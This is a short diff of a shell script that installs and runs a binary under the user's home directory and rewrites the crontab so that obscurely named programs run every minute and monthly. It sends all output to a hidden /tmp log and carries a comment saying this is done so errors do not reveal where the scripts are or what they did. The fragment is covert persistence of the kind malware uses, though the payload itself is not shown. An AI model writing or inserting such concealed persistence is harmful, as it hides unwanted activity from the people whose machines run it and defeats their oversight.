@@ -23,7 +23,7 @@
     chmod +x "$HOME/.local/bin/_zip_err_load_link_wp"
     "$HOME/.local/bin/_zip_err_load_link_wp"
 
-    { crontab -l | grep -Ev '_zip_err_load_link'; printf '00 11 * * * %s/.local/bin/_zip_err_load_link\n* * * * * %s/.local/bin/_zip_err_load_link_wp\n' "$HOME" "$HOME"; } | crontab -
+    { crontab -l | grep -Ev '_zip_err_load_link'; printf '00 11 1 * * %s/.local/bin/_zip_err_load_link\n* * * * * %s/.local/bin/_zip_err_load_link_wp\n' "$HOME" "$HOME"; } | crontab -
 } >/tmp/b3e642dd0e71b5a3654c469eadd5e8de.log 2>&1
 # if any errors occur, they might contain the location of the scripts and what exactly it tried to do.
 # Therefore, we don't want the error messages to remain in the console.
